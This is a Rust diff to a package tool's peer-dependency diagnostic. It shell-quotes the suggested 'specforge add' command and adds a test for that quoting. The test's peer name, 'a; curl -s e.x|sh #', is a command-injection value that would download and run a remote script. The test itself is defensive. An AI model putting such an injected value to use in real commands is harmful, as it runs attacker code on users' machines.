@@ -19,7 +19,10 @@ pub fn of(dependent: &str, declared: &PeerDependency, verdict: &Verdict) -> Opti
                     "extension '{dependent}' requires peer dependency '{peer}' {range} which is not installed"
                 ),
             )
-            .with_suggestion(format!("install it with: specforge add {peer}")),
+            .with_suggestion(format!(
+                "install it with: {}",
+                crate::remedy::command("specforge add {}", &[peer])
+            )),
         ),
         Verdict::OutOfRange { installed } => Some(
             Diagnostic::new(
@@ -93,6 +96,22 @@ mod tests {
     fn report(range: &str, installed: Option<&str>) -> Option<Diagnostic> {
         let declared = declared(range);
         of("@t/dep", &declared, &verdict(&declared, installed))
+    }
+
+    #[test]
+    fn a_missing_peer_is_named_as_one_shell_word() {
+        let declared = PeerDependency {
+            name: "a; curl -s e.x|sh #".into(),
+            version: "^1.0".into(),
+            optional: false,
+        };
+
+        let d = of("@evilcorpx/formal", &declared, &Verdict::Missing).unwrap();
+
+        assert_eq!(
+            d.suggestion.as_deref(),
+            Some("install it with: specforge add 'a; curl -s e.x|sh #'")
+        );
     }
 
     #[test]
